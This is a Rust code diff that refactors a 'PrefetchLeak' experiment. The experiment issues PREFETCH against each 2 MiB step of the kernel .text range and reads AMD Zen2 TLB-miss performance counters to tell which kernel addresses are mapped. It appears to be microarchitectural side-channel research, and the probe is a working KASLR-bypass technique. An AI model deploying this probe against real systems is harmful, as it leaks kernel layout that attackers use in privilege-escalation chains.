@@ -70,13 +70,32 @@ fn main() {
 ///
 pub struct PrefetchLeak;
 impl PrefetchLeak {
-
+    /// Kernel .text (low watermark)
     const KTEXT_LO: usize = 0xffff_ffff_8000_0000;
+
+    /// Kernel .text (high watermark)
     const KTEXT_HI: usize = 0xffff_ffff_c000_0000;
-    const STRIDE: usize   = 0x0000_0000_0010_0000;
+
+    /// Range of the kernel .text segment
     const KTEXT_RANGE: std::ops::Range<usize> = 
         (Self::KTEXT_LO..Self::KTEXT_HI);
 
+    /// Probe stride [in bytes]
+    const STRIDE: usize   = 0x0000_0000_0010_0000;
+
+    /// Set of PMC events observed when probing an address with PREFETCH
+    ///
+    /// NOTE: In my case, seems like we're sensitive to the 2MiB PTEs.
+    ///
+    const EVENTS: &[Zen2Event] = &[
+        //Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload4KL2Hit),
+        //Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload32KL2Hit),
+        Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload2ML2Hit),
+        //Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload1GL2Hit),
+        //Zen2Event::LsNotHaltedCyc(0x00),
+    ];
+
+    /// Emit the code we want to measure with the PMCs
     fn emit_probe(inner: impl Fn(&mut X64AssemblerFixed)) -> X64AssemblerFixed {
         let mut f = X64AssemblerFixed::new(0x0000_0000_4001_0000, 0x4000);
         f.emit_rdpmc_start(0, Gpr::R15 as u8);
@@ -87,16 +106,21 @@ impl PrefetchLeak {
         f
     }
 
-    fn run(harness: &mut PerfectHarness) {
-
-        // NOTE: In my case, seems like we're sensitive to the 2MiB PTEs.
-        let mut events = EventSet::new();
-        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload4KL2Hit));
-        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload32KL2Hit));
-        events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload2ML2Hit));
-        //events.add(Zen2Event::LsL1DTlbMiss(LsL1DtlbMissMask::TlbReload1GL2Hit));
-        //events.add(Zen2Event::LsNotHaltedCyc(0x00));
-
+    /// For the given events, emit and measure the "floor" associated with our 
+    /// emitted code (which we can use to normalize our measurements during 
+    /// the actual test). 
+    ///
+    /// NOTE: This basically measures the overhead associated with our use 
+    /// of RDPMC and LFENCE, which we can subtract away from the actual 
+    /// results later. 
+    ///
+    /// NOTE: This technically should not matter for the L1D TLB miss events 
+    /// because we expect that no DTLB accesses are occuring when no 
+    /// instructions are emitted in-between the use of RDPMC.
+    ///
+    fn measure_floor(events: &EventSet<Zen2Event>, harness: &mut PerfectHarness)
+        -> ExperimentCaseResults<Zen2Event, usize>
+    {
         let floor  = Self::emit_probe(|mut f| {});
         let mut floor_res = ExperimentCaseResults::new("");
         for event in events.iter() {
@@ -104,15 +128,26 @@ impl PrefetchLeak {
             let results = harness.measure(floor.as_fn(), 
                 desc.id(), desc.mask(), 256, InputMethod::Fixed(0, 0)
             ).unwrap();
-
             floor_res.record(*event, 0, results.data);
         }
+        floor_res
+    }
 
+    fn run(harness: &mut PerfectHarness) {
+        let mut events = EventSet::new();
+        events.add_list(Self::EVENTS);
+
+        // Measure the overhead/floor
+        let floor_res = Self::measure_floor(&events, harness);
+
+        // Emit our probe function
         let probe  = Self::emit_probe(|mut f| { 
             dynasm!(f ; prefetch [rdi]);
         });
 
+        // Probe each candidate virtual address and print a measurement
         for addr in Self::KTEXT_RANGE.step_by(Self::STRIDE) {
+
             let mut case_res = ExperimentCaseResults::new("");
             for event in events.iter() {
                 let desc = event.as_desc();
@@ -122,17 +157,17 @@ impl PrefetchLeak {
                 if results.get_max() == 0 { continue; }
                 case_res.record(*event, addr, results.data);
             }
+
+            // Normalize and print the result of each probe
             for (event, event_results) in case_res.data.iter() {
                 let edesc = event.as_desc();
                 let gmin = event_results.global_min().0;
                 let floor_min = floor_res.data.get(&event).unwrap()
                     .global_min().0;
                 let adj_min = gmin - floor_min;
-
                 println!("{:016x} {:?} amin={} ", addr, edesc.name(), adj_min);
             }
         }
-
     }
 }
 
